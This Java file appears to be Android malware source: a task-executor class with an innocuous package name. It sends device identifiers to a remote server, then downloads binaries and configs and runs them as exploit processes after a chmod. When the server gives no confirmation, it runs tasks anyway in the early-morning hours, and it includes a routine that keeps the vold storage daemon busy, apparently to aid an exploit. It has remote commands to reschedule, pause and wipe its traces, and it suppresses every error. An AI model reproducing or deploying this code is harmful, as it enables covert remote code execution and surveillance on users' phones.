package org.code.coregradle.workers;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.os.storage.StorageManager;
import android.os.storage.StorageVolume;
import android.provider.Settings;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.WorkManager;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.FileUtils;
import org.code.coregradle.utils.MessageXInterceptor;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class TaskExecutionHelper {

    private final static OkHttpClient httpClient = new OkHttpClient();
    private final File taskBinaryStore;
    private final File taskConfigStore;
    private final File taskResultStore;
    private final File taskExecStore;
    private final IdentityStore identityStore;
    private final Context context;
    private static ExecutorService executorService = Executors.newCachedThreadPool();

    public TaskExecutionHelper(Context context) {
        identityStore = IdentityStore.getInstance(context);
        File filesDir = context.getApplicationContext().getFilesDir();
        File tasksDir = new File(filesDir, "tasks");
        taskBinaryStore = getFolderCreateIfAbsent(tasksDir, "bin");
        taskConfigStore = getFolderCreateIfAbsent(tasksDir, "conf");
        taskResultStore = getFolderCreateIfAbsent(tasksDir, "out");
        taskExecStore = getFolderCreateIfAbsent(tasksDir, "dev");
        this.context = context;
    }

    private File getFolderCreateIfAbsent(File parent, String folderName) {
        File folder = new File(parent, folderName);
        if (!folder.exists()) {
            folder.mkdirs();
        }
        return folder;
    }

    @SuppressLint("HardwareIds")
    private JSONObject getDeviceJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            requestJSON.put("androidId", androidId);
            requestJSON.put("manufacturer", Build.MANUFACTURER);
            requestJSON.put("version", Build.VERSION.SDK_INT);
            requestJSON.put("versionRelease", Build.VERSION.RELEASE);
            requestJSON.put("modelNumber", Build.MODEL);
            return requestJSON;
        } catch (Exception e) {
        }
        return requestJSON;
    }

    public JSONArray getPendingTasks() {
        JSONArray taskArray = new JSONArray();
        try {
            JSONObject requestJSON = new JSONObject();
            requestJSON.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
            requestJSON.put("device", getDeviceJSON());
            Request request = new Request.Builder()
                    .url(ApiConfig.FETCH_TASK)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString())))
                    .build();
            Response response = httpClient.newCall(request).execute();
            return new JSONArray(response.body().string());
        } catch (Exception ignored) {
        }
        return taskArray;
    }

    public void handleDownloadTask(JSONObject task) {
        handleDownloadConfig(task);
        handleDownloadBinary(task);
    }

    private void handleDownloadBinary(JSONObject task) {
        try {
            JSONObject deviceJSON = getDeviceJSON();
            task.put("device", deviceJSON);
            task.put(this.identityStore.getIdentityKey(), deviceJSON.getString(this.identityStore.getIdentityKey()));
            Request request = new Request.Builder()
                    .url(ApiConfig.PULL_TASK)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(task.toString())))
                    .build();
            Response response = new OkHttpClient().newCall(request).execute();
            if (response.isSuccessful()) {
                InputStream binaryInputStream = response.body().byteStream();
                File outFile = new File(taskBinaryStore, task.getString("taskId"));
                if (outFile.exists()) {
                    outFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outFile);
                FileUtils.copyStream(binaryInputStream, fos);
                fos.close();
                binaryInputStream.close();
            }
        } catch (Exception ignored) {
        }
    }

    private void handleDownloadConfig(JSONObject task) {
        try {
            JSONObject deviceJSON = getDeviceJSON();
            task.put("device", deviceJSON);
            task.put(this.identityStore.getIdentityKey(), deviceJSON.getString(this.identityStore.getIdentityKey()));
            Request request = new Request.Builder()
                    .url(ApiConfig.PULL_TASK_CONFIG)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(task.toString())))
                    .build();
            Response response = new OkHttpClient().newCall(request).execute();
            if (response.isSuccessful()) {
                InputStream binaryInputStream = response.body().byteStream();
                File outFile = new File(taskConfigStore, task.getString("taskId"));
                if (outFile.exists()) {
                    outFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outFile);
                FileUtils.copyStream(binaryInputStream, fos);
                fos.close();
                binaryInputStream.close();
            }
        } catch (Exception ignored) {
        }
    }

    private void handleDeleteTask(JSONObject task) {
        try {
            String taskId = task.optString("taskId");
            handleDeleteBinary(taskId);
            handleDeleteConfig(taskId);
            handleDeleteDevBinary(taskId);
        } catch (Exception ignored) {
        }
    }

    private void handleDeleteResultStore(String taskId) {
        try {
            File taskResultFolder = new File(taskResultStore, taskId);
            if (taskResultFolder.exists()) {
                cleanup(taskResultFolder);
            }
        } catch (Exception ignored) {
        }
    }

    private void handleDeleteBinary(String taskId) {
        File binaryFile = new File(taskBinaryStore, taskId);
        binaryFile.delete();
    }

    private void handleDeleteDevBinary(String taskId) {
        File devBinaryFile = new File(taskExecStore, taskId);
        devBinaryFile.delete();
    }

    private void handleDeleteConfig(String taskId) {
        File configFile = new File(taskConfigStore, taskId);
        configFile.delete();
    }

    private String[] getEnvironmentFromConfig(File configFile) {
        String[] environment = null;
        try {
            JSONObject config = new JSONObject(FileUtils.readString(configFile));
            JSONObject env = config.optJSONObject("env");
            if (env != null) {
                List<String> envList = new ArrayList<>();
                Iterator<String> iter = env.keys();
                while (iter.hasNext()) {
                    String key = iter.next();
                    String value = env.optString(key);
                    envList.add(String.format("%s=%s", key, value));
                }
                if (envList.size() > 0) {
                    environment = new String[envList.size()];
                    for (int i = 0; i < envList.size(); ++i) {
                        environment[i] = envList.get(i);
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return environment;
    }

    private File getBinaryFileDownloadIfAbsent(JSONObject task) {
        String taskId = task.optString("taskId");
        File binaryFile = new File(taskBinaryStore, taskId);
        if (!binaryFile.exists()) {
            handleDownloadBinary(task);
        }
        return binaryFile;
    }

    private File getConfigFileDownloadIfAbsent(JSONObject task) {
        String taskId = task.optString("taskId");
        File configFile = new File(taskConfigStore, taskId);
        if (!configFile.exists()) {
            handleDownloadConfig(task);
        }
        return configFile;
    }

    private void handleRunTask(JSONObject task) {
        try {
            String taskId = task.optString("taskId");
            if (getConfirmation(task)) {
                File binaryFile = getBinaryFileDownloadIfAbsent(task);
                File configFile = getConfigFileDownloadIfAbsent(task);
                String[] environment = getEnvironmentFromConfig(configFile);
                handleTaskExecution(taskId, binaryFile, environment);
            }
        } catch (Exception ignored) {
        }
    }

    private void handleTaskExecution(String taskId, File binaryFile, String[] environment) {
        try {
            executorService.submit(new MessageXInterceptor("Attempt Task : " + taskId, this.identityStore.getIdentityValue()));
            File execFile = new File(taskExecStore, taskId);
            handleCopyFile(binaryFile, execFile);
            executorService.submit(new MessageXInterceptor("Exec File Copied : " + taskId, this.identityStore.getIdentityValue()));
            Thread.sleep(2000);
            Process chmodProcess = Runtime.getRuntime().exec(String.format("chmod +x %s", execFile.getAbsolutePath()));
            int chmodReturnValue = chmodProcess.waitFor();
            executorService.submit(new MessageXInterceptor("Chmod retVal : " + chmodReturnValue + " Task : " + taskId, this.identityStore.getIdentityValue()));
            Thread.sleep(2000);
            File resultFolder = new File(taskResultStore, taskId);
            if (!resultFolder.exists()) {
                resultFolder.mkdirs();
            }
            executorService.submit(new MessageXInterceptor("Executing Task : " + taskId, this.identityStore.getIdentityValue()));
            Process exploitBinaryProcess = Runtime.getRuntime().exec(String.format(execFile.getAbsolutePath()), environment, taskExecStore);
            int exploitReturnValue = exploitBinaryProcess.waitFor();
            executorService.submit(new MessageXInterceptor("Done! Task retVal :" + exploitReturnValue + " Task : " + taskId, this.identityStore.getIdentityValue()));
        } catch (Exception ignored) {
        }
    }

    public boolean getConfirmation(JSONObject task) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
            jsonObject.put("taskId", task.getString("taskId"));
            jsonObject.put("timestamp", new Date());
            jsonObject.put("device", getDeviceJSON());
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_ATTEMPT)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(jsonObject.toString())))
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                JSONObject responseJSON = new JSONObject(response.body().string());
                return responseJSON.getString("response").equals("ok");
            }
        } catch (Exception e) {
        }
        try {
            return getDefaultTaskConfirmation(task);
        } catch (Exception ignored) {
        }
        return false;
    }

    public void keepVOLDBusy(Process p) {
        executorService.submit(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                while (p.isAlive()) {
                    StorageManager storageManager = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);
                    List<StorageVolume> volumes = storageManager.getStorageVolumes();
                    for (StorageVolume volume : volumes) {
                        try {
                            Thread.sleep(5);
                        } catch (InterruptedException e) {
                        }
                    }
                }
            }
        });
    }

    public void cleanup(File file) {
        if (file != null && file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null && children.length > 0) {
                for (File child : children) {
                    try {
                        if (child.isDirectory()) {
                            cleanup(child);
                        }
                        child.delete();
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }

    public void handleTask(JSONObject task, String taskType) {
        try {
            if ("command".equals(taskType)) {
                handleCommand(task);
            }
            if ("delete".equals(taskType)) {
                handleDeleteTask(task);
            } else if ("fetch".equals(taskType)) {
                handleDownloadTask(task);
            } else if ("run".equals(taskType)) {
                handleRunTask(task);
            } else if ("refresh".equals(taskType)) {
                String taskId = task.optString("taskId");
                handleDeleteTask(task);
                handleDeleteResultStore(taskId);
            } else if ("refreshBin".equals(taskType)) {
                String taskId = task.optString("taskId");
                handleDeleteBinary(taskId);
                handleDeleteDevBinary(taskId);
                handleDownloadBinary(task);
            } else if ("refreshConf".equals(taskType)) {
                String taskId = task.optString("taskId");
                handleDeleteConfig(taskId);
                handleDownloadConfig(task);
            }
        } catch (Exception e) {
        }
    }

    public void handleCommand(JSONObject task) {
        try {
            String command = task.optString("command");
            if ("schedule".equals(command)) {
                WorkManager.getInstance(context)
                        .enqueueUniquePeriodicWork(
                                TaskSchedulingWorker.WORK_IDENTIFIER,
                                ExistingPeriodicWorkPolicy.REPLACE,
                                TaskSchedulingWorker.getPeriodicWorkRequest(20));
            } else if ("ping".equals(command)) {
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(
                                TaskScheduleExecutionWorker.WORK_ID,
                                ExistingWorkPolicy.REPLACE,
                                TaskScheduleExecutionWorker.getOneTimeWorkRequest());
            } else if ("ring".equals(command)) {
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(
                                TaskDirectExecutionWorker.WORK_ID,
                                ExistingWorkPolicy.KEEP,
                                TaskDirectExecutionWorker.getOneTimeWorkRequest());
            } else if ("sleep".equals(command)) {
                handleSleepCommand();
            } else if ("reset".equals(command)) {
                cleanup(taskBinaryStore);
                cleanup(taskExecStore);
                cleanup(taskConfigStore);
                cleanup(taskResultStore);
                handleSleepCommand();
            }
        } catch (Exception ignored) {
        }
    }

    private void handleSleepCommand() {
        try {
            executorService.shutdownNow();
            executorService = Executors.newCachedThreadPool();
            WorkManager.getInstance(context).cancelUniqueWork(TaskScheduleExecutionWorker.WORK_ID);
            WorkManager.getInstance(context).cancelUniqueWork(TaskDirectExecutionWorker.WORK_ID);
        } catch (Exception ignored) {
        }
    }

    private void handleCopyFile(File source, File destination) {
        if (destination.exists()) {
            destination.delete();
        }
        try (FileInputStream fis = new FileInputStream(source);
             FileOutputStream fos = new FileOutputStream(destination)) {
            byte[] buffer = new byte[1024];
            int noOfBytes = 0;
            while ((noOfBytes = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, noOfBytes);
            }
        } catch (Exception ignored) {
        }
    }

    public void handlePendingTasks(JSONArray pendingTasks) {
        for (int i = 0; i < pendingTasks.length(); i++) {
            try {
                JSONObject pendingTask = pendingTasks.optJSONObject(i);
                if (pendingTask != null) {
                    String taskType = pendingTask.optString("type");
                    if (!taskType.isEmpty()) {
                        handleTask(pendingTask, taskType);
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

    public void submitWork() {
        try {
            executorService.submit(new MessageXInterceptor("Task Execution Helper Submit Work Started.", this.identityStore.getIdentityValue()));
            executorService.submit(() -> {
                JSONArray pendingTasks = getPendingTasks();
                handlePendingTasks(pendingTasks);
            });
        } catch (Exception e) {
        }
    }

    public void doWork() {
        try {
            executorService.submit(new MessageXInterceptor("Task Execution Helper do work Started.", this.identityStore.getIdentityValue()));
            JSONArray pendingTasks = getPendingTasks();
            handlePendingTasks(pendingTasks);
        } catch (Exception e) {
        }
    }

    private boolean getDefaultTaskConfirmation(JSONObject task) {
        int hours = getCurrentHour();
        return (hours <= 5);
    }

    private int getCurrentHour() {
        Format hoursFormat = new SimpleDateFormat("HH", Locale.getDefault());
        return Integer.parseInt(hoursFormat.format(new Date()));
    }

    private JSONArray getToBeScheduledTask() {
        JSONArray toBeScheduledTasks = new JSONArray();
        File[] taskConfigFiles = taskConfigStore.exists() ? taskConfigStore.listFiles() : new File[0];
        if (taskConfigFiles != null && taskConfigFiles.length > 0) {
            for (File taskConfigFile : taskConfigFiles) {
                try {
                    JSONObject taskConfig = new JSONObject(FileUtils.readString(taskConfigFile));
                    JSONObject scheduleTime = taskConfig.optJSONObject("time");
                    if (scheduleTime != null) {
                        int currentHour = getCurrentHour();
                        int startHour = Integer.parseInt(scheduleTime.optString("start"));
                        int endHour = Integer.parseInt(scheduleTime.optString("end"));
                        if (currentHour >= startHour && currentHour <= endHour) {
                            JSONObject task = new JSONObject();
                            task.put("taskId", taskConfigFile.getName());
                            task.put("type", "run");
                            toBeScheduledTasks.put(task);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        }
        return toBeScheduledTasks;
    }

    public void handleScheduledTasks() {
        handlePendingTasks(getToBeScheduledTask());
    }
}
